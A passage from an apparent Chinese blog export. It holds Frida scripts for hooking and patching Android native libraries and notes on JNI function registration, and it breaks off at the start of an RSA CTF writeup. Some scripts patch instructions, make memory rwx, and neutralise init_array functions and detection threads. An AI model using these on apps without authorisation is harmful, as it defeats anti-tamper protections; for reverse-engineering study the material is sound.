Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); console.log(soAddr); var funcAddr = soAddr.add(0x23F4); // ARM Thumb 模式下需加 1，ARM 不需加 console.log(funcAddr); if (funcAddr !== null) { Interceptor.attach(funcAddr, { onEnter: function(args){ // 入参处理 }, onLeave: function(retval){ console.log(hexdump(retval)); // 输出当前地址的十六进制数据 } }); } so Hook 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 function print_arg(addr){ var module = Process.findRangeByAddress(addr); if (module !== null) return hexdump(addr) + \u0026#34;\\n\u0026#34;; return ptr(addr) + \u0026#34;\\n\u0026#34;; } function hook_native_addr(funcPtr){ var module = Process.findModuleByAddress(funcPtr); Interceptor.attach(funcPtr, { onEnter: function(args){ this.logs = []; this.logs.push(\u0026#34;call \u0026#34; + module.name + \u0026#34;!\u0026#34; + ptr(funcPtr).sub(module.base) + \u0026#34;\\n\u0026#34;); this.args0 = args[0]; this.args1 = args[1]; this.logs.push(\u0026#34;this.args0 onEnter: \u0026#34; + print_arg(this.args0)); this.logs.push(\u0026#34;this.args1 onEnter: \u0026#34; + print_arg(this.args1)); }, onLeave: function(retval){ this.logs.push(\u0026#34;this.args0 onLeave: \u0026#34; + print_arg(this.args0)); this.logs.push(\u0026#34;this.args1 onLeave: \u0026#34; + print_arg(this.args1)); this.logs.push(\u0026#34;retval onLeave: \u0026#34; + retval + \u0026#34;\\n\u0026#34;); console.log(this.logs); } }); } 修改函数数值参数和返回值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var addAddr = Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;add\u0026#34;); console.log(addAddr); if (addAddr !== null) { Interceptor.attach(addAddr, { onEnter: function(args){ args[2] = ptr(1000); // 新值 console.log(args[2].toInt32()); }, onLeave: function(retval){ retval.replace(20000); console.log(\u0026#34;retval\u0026#34;, retval.toInt32()); } }); } 获取指针参数返回值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); console.log(soAddr); var sub_208C = soAddr.add(0x208C); console.log(sub_208C); if (sub_208C !== null) { Interceptor.attach(sub_208C, { onEnter: function(args){ this.args1 = args[1]; }, onLeave: function(retval){ console.log(hexdump(this.args1)); } }); } Hook dlopen 有些函数在 SO 首次加载时执行，而 SO 未加载前无法进行 Hook。 因此，需 监控 SO 的加载时机，在 SO 加载完成后立即进行 Hook。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function hook_dlopen(addr, soName, callback) { Interceptor.attach(addr, { onEnter: function(args){ var name = args[0].readCString(); if (name.indexOf(soName) !== -1) this.hook = true; }, onLeave: function(retval){ if (this.hook) callback(); } }); } var dlopen = Module.findExportByName(null, \u0026#34;dlopen\u0026#34;); var android_dlopen_ext = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); hook_dlopen(dlopen, \u0026#34;libxxx.so\u0026#34;, hookfunc); hook_dlopen(android_dlopen_ext, \u0026#34;libxxx.so\u0026#34;, hookfunc); 内存读写 1. 读取指定地址的字符串 1 2 var soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); console.log(soAddr.add(0x2C00).readCString()); 2. Dump 指定地址的内存 1 console.log(hexdump(soAddr.add(0x2C00))); 3. 读指定地址的内存 1 2 console.log(soAddr.add(0x2C00).readByteArray(16)); console.log(Memory.readByteArray(soAddr.add(0x2C00), 16)); // 原先的 API 4. 写指定地址的内存 1 2 soAddr.add(0x2C00).writeByteArray(stringToBytes(\u0026#34;xxxxx\u0026#34;)); console.log(hexdump(soAddr.add(0x2C00))); 5. 申请新内存并写入 1 2 Memory.alloc(); Memory.allocUtf8String(); 6. 修改内存权限 1 Memory.protect(ptr(libso.base), libso.size, \u0026#39;rwx\u0026#39;); Frida 修改 SO 函数代码 1. 修改地址对应的指令 1 2 soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); soAddr.add(0x1684).writeByteArray(hexToBytes(\u0026#34;0001094B\u0026#34;)); ARM 与 Hex 在线转换：ARM Converter\n2. 将对应地址的指令解析成汇编 1 2 var ins = Instruction.parse(soAddr.add(0x1684)); console.log(ins.toString()); 3. 使用 Frida 提供的 API 写汇编代码 1 2 new Arm64Writer(soAddr.add(0x167C)).putNop(); console.log(Instruction.parse(soAddr.add(0x167C)).toString()); 4. 使用 Frida 提供的 API 写汇编代码 1 2 3 4 5 6 7 8 var codeAddr = soAddr.add(0x167C); Memory.patchCode(codeAddr, 8, function (code) { var writer = new Arm64Writer(code, { pc: codeAddr }); writer.putBytes(hexToBytes(\u0026#34;0001094B\u0026#34;)); writer.putBytes(hexToBytes(\u0026#34;FF830091\u0026#34;)); writer.putRet(); writer.flush(); }); SO 层主动调用任意函数 1. 声明函数指针 文档：Frida JavaScript API - NativeFunction\n语法：new NativeFunction(address, returnType, argTypes[, abi])\n支持的 returnType 和 argTypes：\n基本类型：void、pointer、int、uint、long、ulong、char、uchar、float、double 定长整数：int8、uint8、int16、uint16、int32、uint32、int64、uint64、bool 大小类型：size_t、ssize_t 2. 代码示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Java.perform(function(){ // 获取函数地址 var funcAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;).add(0x23F4); // 声明函数指针 var func = new NativeFunction(funcAddr, \u0026#34;pointer\u0026#34;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); var env = Java.vm.tryGetEnv(); console.log(\u0026#34;env: \u0026#34;, JSON.stringify(env)); if (env !== null) { var jstr = env.newStringUtf(\u0026#34;Je2em1ah is very good!!!\u0026#34;); var cstr = func(env, jstr); console.log(cstr.readCString()); console.log(hexdump(cstr)); } }); Hook libc 读写文件 1. 使用 Frida API 写文件 1 2 3 4 var file = new File(\u0026#34;/sdcard/xxxx.txt\u0026#34;, \u0026#34;w\u0026#34;); file.write(\u0026#34;Je2em1ah is very good!!!\\n\u0026#34;); file.flush(); file.close(); 2. Hook libc 写文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var addr_fopen = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;fopen\u0026#34;); var addr_fputs = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;fputs\u0026#34;); var addr_fclose = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;fclose\u0026#34;); console.log(\u0026#34;addr_fopen:\u0026#34;, addr_fopen, \u0026#34;addr_fputs:\u0026#34;, addr_fputs, \u0026#34;addr_fclose:\u0026#34;, addr_fclose); var fopen = new NativeFunction(addr_fopen, \u0026#34;pointer\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]); var fputs = new NativeFunction(addr_fputs, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]); var fclose = new NativeFunction(addr_fclose, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;]); var filename = Memory.allocUtf8String(\u0026#34;/sdcard/xxx.txt\u0026#34;); // 注意：sdcard 权限不足可能导致写入失败 var open_mode = Memory.allocUtf8String(\u0026#34;w\u0026#34;); var file = fopen(filename, open_mode); console.log(\u0026#34;fopen:\u0026#34;, file); var buffer = Memory.allocUtf8String(\u0026#34;Jeremiah\\n\u0026#34;); var retval = fputs(buffer, file); console.log(\u0026#34;fputs:\u0026#34;, retval); fclose(file); JNI 函数的 Hook 1. Hook libart 来 Hook JNI 相关函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var artSym = Module.enumerateSymbols(\u0026#34;libart.so\u0026#34;); // 原先的 API var NewStringUTFAddr = null; for (var i = 0; i \u0026lt; artSym.length; i++) { if (artSym[i].name.indexOf(\u0026#34;CheckJNI\u0026#34;) === -1 \u0026amp;\u0026amp; artSym[i].name.indexOf(\u0026#34;NewStringUTF\u0026#34;) !== -1) { NewStringUTFAddr = artSym[i].address; } } if (NewStringUTFAddr !== null) { Interceptor.attach(NewStringUTFAddr, { onEnter: function(args){ console.log(args[1].readCString()); }, onLeave: function(retval){ // 可选：在需要时添加处理逻辑 } }); } 2. 计算地址方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Java.perform(function(){ console.log(\u0026#34;Process.arch: \u0026#34;, Process.arch); var envAddr = ptr(Java.vm.tryGetEnv().handle).readPointer(); // 获取 JNIEnv 的地址 var newStringUtfAddr = envAddr.add(0x538).readPointer(); console.log(\u0026#34;newStringUtfAddr\u0026#34;, newStringUtfAddr); if (newStringUtfAddr !== null) { Interceptor.attach(newStringUtfAddr, { onEnter: function(args){ console.log(args[1].readCString()); }, onLeave: function(retval){ // 可选：在需要时添加处理逻辑 } }); } }); 主动调用 JNI 函数 1. 使用 Frida 封装的函数调用 JNI 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var funcAddr = Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;functionName\u0026#34;); console.log(funcAddr); if (funcAddr !== null) { Interceptor.attach(funcAddr, { onEnter: function(args){ // 入参处理 }, onLeave: function(retval){ var env = Java.vm.tryGetEnv(); var jstr = env.newStringUtf(\u0026#34;bbs.125.la\u0026#34;); // 主动调用 JNI 函数：CSTR 转 JSTR retval.replace(jstr); var cstr = env.getStringUtfChars(jstr); // 主动调用 JNI 函数：JSTR 转 CSTR console.log(cstr.readCString()); console.log(hexdump(cstr)); } }); } 2. 使用 NativeFunction 主动调用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var symbols = Process.getModuleByName(\u0026#34;libart.so\u0026#34;).enumerateSymbols(); var newStringUtf = null; for (let i = 0; i \u0026lt; symbols.length; i++) { var symbol = symbols[i]; if (symbol.name.indexOf(\u0026#34;CheckJNI\u0026#34;) === -1 \u0026amp;\u0026amp; symbol.name.indexOf(\u0026#34;NewStringUTF\u0026#34;) !== -1) { console.log(symbol.name, symbol.address); newStringUtf = symbol.address; } } var newStringUtf_func = new NativeFunction(newStringUtf, \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); var jstring = newStringUtf_func(Java.vm.tryGetEnv().handle, Memory.allocUtf8String(\u0026#34;Je2em1ah\u0026#34;)); console.log(jstring); var envAddr = Java.vm.tryGetEnv().handle.readPointer(); var GetStringUTFChars = envAddr.add(0x548).readPointer(); var GetStringUTFChars_func = new NativeFunction(GetStringUTFChars, \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); var cstr = GetStringUTFChars_func(Java.vm.tryGetEnv().handle, jstring, ptr(0)); console.log(cstr.readCString()); SO 层打印函数调用栈 通过 Hook 系统函数，打印函数栈，可以快速定位到关键代码。 Frida 提供了 SO 层打印函数栈的方法： 1 console.log(Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(\u0026#39;\\n\u0026#39;) + \u0026#39;\\n\u0026#39;); // `ACCURATE` 表示精确，`FUZZY` 表示模糊 定位静态注册函数的方法 静态注册的函数会通过 dlsym 查找符号，因此可以通过 Hook dlsym 函数来快速定位。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function hook_dlsym(){ var dlsymAddr = Module.findExportByName(\u0026#34;libdl.so\u0026#34;, \u0026#34;dlsym\u0026#34;); console.log(dlsymAddr); if (dlsymAddr !== null) { Interceptor.attach(dlsymAddr, { onEnter: function(args){ this.args1 = args[1]; }, onLeave: function(retval){ var module = findModuleByAddress(retval); console.log(this.args1.readCString(), retval, module.name, retval.sub(module.base)); } }); } } 定位动态注册函数的方法 动态注册的函数会通过 RegisterNatives 函数加载，因此 Hook RegisterNatives 可以快速定位函数位置。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 function hook_RegisterNatives() { var RegisterNatives_addr = null; var symbols = Process.findModuleByName(\u0026#34;libart.so\u0026#34;).enumerateSymbols(); for (var i = 0; i \u0026lt; symbols.length; i++) { var symbol = symbols[i].name; if (symbol.indexOf(\u0026#34;CheckJNI\u0026#34;) === -1 \u0026amp;\u0026amp; symbol.indexOf(\u0026#34;JNI\u0026#34;) \u0026gt;= 0) { if (symbol.indexOf(\u0026#34;RegisterNatives\u0026#34;) \u0026gt;= 0) { RegisterNatives_addr = symbols[i].address; console.log(\u0026#34;RegisterNatives_addr: \u0026#34;, RegisterNatives_addr); } } } if (RegisterNatives_addr !== null) { Interceptor.attach(RegisterNatives_addr, { onEnter: function (args) { var env = args[0]; var jclass = args[1]; var class_name = Java.vm.tryGetEnv().getClassName(jclass); var methods_ptr = ptr(args[2]); var method_count = args[3].toInt32(); console.log(\u0026#34;RegisterNatives method counts: \u0026#34;, method_count); for (var i = 0; i \u0026lt; method_count; i++) { var name = methods_ptr.add(i * Process.pointerSize * 3).readPointer().readCString(); var sig = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize).readPointer().readCString(); var fnPtr_ptr = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2).readPointer(); var find_module = Process.findModuleByAddress(fnPtr_ptr); console.log(\u0026#34;RegisterNatives java_class: \u0026#34;, class_name, \u0026#34;name: \u0026#34;, name, \u0026#34;sig: \u0026#34;, sig, \u0026#34;fnPtr: \u0026#34;, fnPtr_ptr, \u0026#34;module_name: \u0026#34;, find_module.name, \u0026#34;module_base: \u0026#34;, find_module.base, \u0026#34;offset: \u0026#34;, ptr(fnPtr_ptr).sub(find_module.base)); } }, onLeave: function (retval) {} }); } } Frida InlineHook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function inlineHook() { // 示例 1 /* var nativePointer = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); var hookAddr = nativePointer.add(0x17BC); Interceptor.attach(hookAddr, { onEnter: function (args) { console.log(\u0026#34;onEnter: \u0026#34;, this.context.x8); }, onLeave: function (retval) { console.log(\u0026#34;onLeave: \u0026#34;, this.context.x8.toInt32()); console.log(this.context.x8 \u0026amp; 7); } }); */ // 示例 2 var nativePointer = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); var hookAddr = nativePointer.add(0x1B70); Interceptor.attach(hookAddr, { onEnter: function (args) { console.log(\u0026#34;onEnter: \u0026#34;, this.context.x1); console.log(\u0026#34;onEnter: \u0026#34;, hexdump(this.context.x1)); }, onLeave: function (retval) { // 可选：在需要时添加处理逻辑 } }); } Hook init or initArray SO 中 init 段和 initarray 段的加载时机是在 dlopen 函数中进行加载，因此需在 dlopen 执行时监控 SO 的加载并同时 Hook init 和 initarray。 init 和 initarray 通过 linker 或 linker64 文件的 call_constructors 函数进行调用。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 function hook_dlopen(){ var dlopen = Module.findExportByName(null, \u0026#34;dlopen\u0026#34;); console.log(dlopen); if (dlopen !== null) { Interceptor.attach(dlopen, { onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); if (soName.indexOf(\u0026#34;libxxx.so\u0026#34;) !== -1) { hook_initarray(); } }, onLeave: function(retval){} }); } var android_dlopen_ext = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); console.log(android_dlopen_ext); if (android_dlopen_ext !== null) { Interceptor.attach(android_dlopen_ext, { onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); if (soName.indexOf(\u0026#34;libxxx.so\u0026#34;) !== -1) { hook_initarray(); } }, onLeave: function(retval){} }); } } var hooked = false; function hook_initarray(){ var call_constructorsAddr = null; var linkerSymbols = Module.enumerateSymbolsSync(\u0026#34;linker64\u0026#34;); // 可能是 linker 或 linker64 for (var i = 0; i \u0026lt; linkerSymbols.length; i++) { if (linkerSymbols[i].name === \u0026#34;__dl__ZN6soinfo17call_constructorsEv\u0026#34;) { call_constructorsAddr = linkerSymbols[i].address; console.log(linkerSymbols[i].name, linkerSymbols[i].address); } } if (call_constructorsAddr !== null \u0026amp;\u0026amp; !hooked) { Interceptor.attach(call_constructorsAddr, { onEnter: function(args){ var soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); var initArrayTest2 = soAddr.add(0x2B08); var initArrayTest1 = soAddr.add(0x2AD8); Interceptor.replace(initArrayTest2, new NativeCallback(function(a){}, \u0026#34;int\u0026#34;, [\u0026#39;int\u0026#39;])); Interceptor.replace(initArrayTest1, new NativeCallback(function(a){}, \u0026#34;int\u0026#34;, [\u0026#39;int\u0026#39;])); hooked = true; }, onLeave: function(retval){} }); } } function main(){ hook_dlopen(); } setImmediate(main); Hook JNI_OnLoad 注入点在 dlopen 加载 结束 之后。 1 2 3 4 5 6 7 8 9 10 11 function hook_JNI_Onload(){ var JNI_Onload = Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;JNI_OnLoad\u0026#34;); if (JNI_Onload !== null) { Interceptor.attach(JNI_Onload, { onEnter: function(args){ console.log(\u0026#34;JNI_OnLoad is called\u0026#34;); }, onLeave: function(retval){} }); } } Hook pthread_create 一些 检测函数 需要 实时 运行，可能会使用 pthread 开启子线程。 Hook pthread_create 可查看开启了哪些子线程，并可干掉与检测相关的子线程。 函数原型 1 int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine)(void *), void *arg); pthread_t *thread\n指向 pthread_t 类型变量的指针，用于返回新创建线程的标识符。\nconst pthread_attr_t *attr\n指向线程属性对象的指针，用于设置线程的属性（如栈大小、调度策略等）。如果使用默认属性，可以传递 NULL。\nvoid *(*start_routine)(void *)\n线程的起始函数，必须是一个返回 void* 并接受一个 void* 类型参数的函数指针。\nvoid *arg\n传递给 start_routine 函数的参数，可以是任意类型的指针。如果不需要参数，可以传递 NULL。\nHook 实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function hook_pthread_create(){ var pthread_create_addr = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;pthread_create\u0026#34;); console.log(\u0026#34;pthread_create_addr: \u0026#34;, pthread_create_addr); if (pthread_create_addr !== null) { Interceptor.attach(pthread_create_addr, { onEnter: function(args){ console.log(\u0026#34;pthread_t *thread:\u0026#34;, args[0]); console.log(\u0026#34;const pthread_attr_t *attr:\u0026#34;, args[1]); console.log(\u0026#34;void *(*start_routine)(void *):\u0026#34;, args[2]); console.log(\u0026#34;void *arg:\u0026#34;, args[3]); }, onLeave: function(retval){ console.log(\u0026#34;pthread_create retval:\u0026#34;, retval); } }); } } 内存读写监控 通过 Process.setExceptionHandler 提供一个回调函数来 监控内存的读写操作。这种方法可以帮助开发者在特定内存地址发生读写时捕获异常，从而进行调试或逆向分析。\n实现步骤 1. Hook dlopen 函数以监控 SO 文件的加载 首先，通过 Hook dlopen 和 android_dlopen_ext 函数，监控目标 SO 文件的加载。一旦检测到指定的 SO 文件被加载，即可执行相应的回调函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function hook_dlopen(addr, soName, callback) { Interceptor.attach(addr, { onEnter: function (args) { var soPath = args[0].readCString(); if (soPath.indexOf(soName) !== -1) { this.hook = true; } }, onLeave: function (retval) { if (this.hook) { callback(); } } }); } var dlopen = Module.findExportByName(\u0026#34;libdl.so\u0026#34;, \u0026#34;dlopen\u0026#34;); var android_dlopen_ext = Module.findExportByName(\u0026#34;libdl.so\u0026#34;, \u0026#34;android_dlopen_ext\u0026#34;); hook_dlopen(dlopen, \u0026#34;libxiaojianbang.so\u0026#34;, set_read_write_break); hook_dlopen(android_dlopen_ext, \u0026#34;libxiaojianbang.so\u0026#34;, set_read_write_break); 2. 设置异常处理器以监控内存读写 通过 Process.setExceptionHandler，设置一个异常处理器，当目标内存地址的读写操作触发异常时，回调函数将被调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 function set_read_write_break(){ Process.setExceptionHandler(function(details) { // 错误回调函数 console.log(JSON.stringify(details, null, 2)); console.log(\u0026#34;lr:\u0026#34;, DebugSymbol.fromAddress(details.context.lr)); console.log(\u0026#34;pc:\u0026#34;, DebugSymbol.fromAddress(details.context.pc)); // 获取完成信息之后将内存权限复原 Memory.protect(details.memory.address, Process.pointerSize, \u0026#39;rwx\u0026#39;); // 打印调用栈 console.log(Thread.backtrace(details.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress) .join(\u0026#39;\\n\u0026#39;) + \u0026#39;\\n\u0026#39;); return true; // 继续执行 }); // 目标内存地址 var addr = Module.findBaseAddress(\u0026#34;libxiaojianbang.so\u0026#34;).add(0x3DED); // 修改内存权限为不可读写，只能执行，触发异常 Memory.protect(addr, 8, \u0026#39;---\u0026#39;); } 相关知识拓展 Process.setExceptionHandler 的作用 Process.setExceptionHandler 用于设置一个全局的异常处理器，当程序执行过程中发生异常时，该处理器会被调用。通过这种方式，可以捕获内存访问违规等异常，进行调试或逆向分析。\n","date":"2025-01-01T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501012305144.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/fridahookso/","title":"FridaHookSo"},{"content":"So相关知识学习 JNI函数的静态注册 必须遵循一定的命名规则，一般是 Java_包名_类名_方法名\n系统会通过 dlopen 加载对应的 SO，通过 dlsym 来获取指定名字的函数地址，然后调用静态注册的 JNI 函数，必然在导出表里\n编译 SO 的时候不会给对应 JNI 函数具体地址，在 第一次调用 的时候才会有具体地址\nJNI函数的动态注册 通过 env-\u0026gt;RegisterNatives 注册函数，通常在 JNI_OnLoad 中注册 JNINativeMethod\n函数签名\n可以给同一个 Java 函数注册多个 native 函数，以最后一次为准\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 jclass MainActivityClazz = env-\u0026gt;FindClass(\u0026#34;com/Jeremiah/ndk/NDKMain\u0026#34;); /* typedef struct { // JNINativeMethod 结构体的实现 const char* name; // Java层对应方法名 const char* signature; // 函数签名 void* fnptr; // 函数指针（即SO中函数的地址） } JNINativeMethod; */ JNINativeMethod methods[] = { {\u0026#34;encode\u0026#34;, \u0026#34;(ILjava/lang/String;[B)Ljava/lang/String;\u0026#34;, (void *)encodeFromC}, }; env-\u0026gt;RegisterNatives(MainActivityClazz, methods, sizeof(methods)/sizeof(JNINativeMethod)); JNI_Onload定义 1 2 3 4 5 6 7 8 9 10 11 JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) { JNIEnv *env = nullptr; if (vm-\u0026gt;GetEnv((void **) \u0026amp;env, JNI_VERSION_1_6) != JNI_OK) { LOGD(\u0026#34;GetEnv failed\u0026#34;); return -1; } return JNI_VERSION_1_6; } // 一个 SO 中可以不定义 JNI_OnLoad // 一旦定义了 JNI_OnLoad，在 SO 被加载的时候会自动执行 // 必须返回 JNI 版本 JNI_VERSION_1_6 SO之间的相互调用 使用 dlopen, dlsym, dlclose 获取函数地址，然后调用。需要导入 dlfcn.h\ndlopen 第一个参数为要加载的 SO 的 绝对路径，第二个参数为 符号解析的时机，返回值为该 SO 的一个 句柄\ndlsym 第一个参数为 dlopen 返回的 库句柄，第二个参数为要查找的 符号的名字，返回值为 该符号的指针\nreinterpret_cast\u0026lt;void (*)(char *) 为 C++ 中的一个方法，用于两个不同类型指针的强制转换\n1 2 3 4 void *soinfo = dlopen(nativePath, RTLD_NOW); void (*def)(char* str) = nullptr; def = reinterpret_cast\u0026lt;void (*)(char *)\u0026gt;(dlsym(soinfo, \u0026#34;_Z7fromSoBPc\u0026#34;)); def(\u0026#34;Jeremiah\u0026#34;); extern 函数声明 SO路径的动态获取 32 和 64 的 SO 存放路径不一样，为了更加通用，可以用代码动态获取 SO 路径 1 2 3 4 5 6 7 8 9 10 11 12 13 public String getPath(Context cxt){ PackageManager pm = cxt.getPackageManager(); List\u0026lt;PackageInfo\u0026gt; pkgList = pm.getInstalledPackages(0); if (pkgList == null || pkgList.size() == 0) return null; for (PackageInfo pi : pkgList) { if (pi.applicationInfo.nativeLibraryDir.startsWith(\u0026#34;/data/app/\u0026#34;) // 路径 \u0026amp;\u0026amp; pi.packageName.startsWith(\u0026#34;com.Jeremiah.test\u0026#34;)) { // 包名 // Log.e(\u0026#34;Jeremiah\u0026#34;, pi.applicationInfo.nativeLibraryDir); return pi.applicationInfo.nativeLibraryDir; } } return null; } 通过JNI创建Java对象 NewObject 创建对象\n1 2 3 4 jclass clazz = env-\u0026gt;FindClass(\u0026#34;com/Jeremiah/ndk/NDKDemo\u0026#34;); jmethodID methodID = env-\u0026gt;GetMethodID(clazz, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, \u0026#34;()V\u0026#34;); jobject ReflectDemoObj = env-\u0026gt;NewObject(clazz, methodID); LOGD(\u0026#34;ReflectDemoObj %p\u0026#34;, ReflectDemoObj); AllocObject 创建对象\n1 2 3 4 5 jclass clazz = env-\u0026gt;FindClass(\u0026#34;com/Jeremiah/ndk/NDKDemo\u0026#34;); jmethodID methodID2 = env-\u0026gt;GetMethodID(clazz, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, \u0026#34;(Ljava/lang/String;I)V\u0026#34;); jobject ReflectDemoObj2 = env-\u0026gt;AllocObject(clazz); jstring jstr = env-\u0026gt;NewStringUTF(\u0026#34;from jni str\u0026#34;); env-\u0026gt;CallNonvirtualVoidMethod(ReflectDemoObj2, clazz, methodID2, jstr, 100); 通过JNI访问Java属性 获取静态字段\n1 2 3 4 5 6 7 8 jfieldID privateStaticStringField = env-\u0026gt;GetStaticFieldID(clazz, \u0026#34;privateStaticStringField\u0026#34;, \u0026#34;Ljava/lang/String;\u0026#34;); jstring privateStaticString = static_cast\u0026lt;jstring\u0026gt;(env-\u0026gt;GetStaticObjectField(clazz, privateStaticStringField)); const char* privatecstr = env-\u0026gt;GetStringUTFChars(privateStaticString, nullptr); LOGD(\u0026#34;privateStaticString: %s\u0026#34;, privatecstr); env-\u0026gt;ReleaseStringUTFChars(privateStaticString, privatecstr); 获取对象字段\n1 2 3 4 5 6 7 jfieldID publicStringField = env-\u0026gt;GetFieldID(clazz, \u0026#34;publicStringField\u0026#34;, \u0026#34;Ljava/lang/String;\u0026#34;); jstring publicString = static_cast\u0026lt;jstring\u0026gt;(env-\u0026gt;GetObjectField(ReflectDemoObj, publicStringField)); const char* publiccstr = env-\u0026gt;GetStringUTFChars(publicString, nullptr); LOGD(\u0026#34;publicStringField: %s\u0026#34;, publiccstr); 设置字段\n1 env-\u0026gt;SetObjectField(ndkobj, privateStringFieldID, env-\u0026gt;NewStringUTF(\u0026#34;Jeremiah\u0026#34;)); 通过JNI访问Java数组 获取数组字段ID\n1 2 3 4 jfieldID byteArrayID = env-\u0026gt;GetFieldID(clazz, \u0026#34;byteArray\u0026#34;, \u0026#34;[B\u0026#34;); jbyteArray byteArray = static_cast\u0026lt;jbyteArray\u0026gt;(env-\u0026gt;GetObjectField(ReflectDemoObj, byteArrayID)); int _byteArrayLength = env-\u0026gt;GetArrayLength(byteArray); // 得到数组长度 修改数组字段\n1 2 3 4 5 6 char javaByte[10]; for(int i = 0; i \u0026lt; 10; i++){ javaByte[i] = static_cast\u0026lt;char\u0026gt;(100 - i); } const jbyte *java_array = reinterpret_cast\u0026lt;const jbyte *\u0026gt;(javaByte); env-\u0026gt;SetByteArrayRegion(byteArray, 0, _byteArrayLength, java_array); 获取数组字段\n1 2 3 4 5 6 7 byteArray = static_cast\u0026lt;jbyteArray\u0026gt;(env-\u0026gt;GetObjectField(ReflectDemoObj, byteArrayID)); _byteArrayLength = env-\u0026gt;GetArrayLength(byteArray); char* str = reinterpret_cast\u0026lt;char *\u0026gt;(env-\u0026gt;GetByteArrayElements(byteArray, nullptr)); for(int i = 0; i \u0026lt; _byteArrayLength; i++){ LOGD(\u0026#34;str[%d]=%d\u0026#34;, i, str[i]); } env-\u0026gt;ReleaseByteArrayElements(jbyteArray, reinterpret_cast\u0026lt;jbyte *\u0026gt;(cbyteArray), 0); ","date":"2024-12-30T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011927263.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/android-so%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","title":"Android So相关知识"},{"content":"Crypto Crypto01（By Luminoria） 小华刚上班第一天，便发现自己的重要文件被加密，只留下了一段神秘代码，请你结合神秘代码帮助他解密。\n从附件得到题目源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from Crypto.Util.number import * from secret import flag p = getPrime(512) q = getPrime(512) n = p * q d = getPrime(299) e = inverse(d,(p-1)*(q-1)) m = bytes_to_long(flag) c = pow(m,e,n) hint1 = p \u0026gt;\u0026gt; (512-70) hint2 = q \u0026gt;\u0026gt; (512-70) print(f\u0026#34;n = {n}\u0026#34;) print(f\u0026#34;e = {e}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) print(f\u0026#34;hint1 = {hint1}\u0026#34;) print(f\u0026#34;hint2 = {hint2}\u0026#34;) n = 114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971 e = 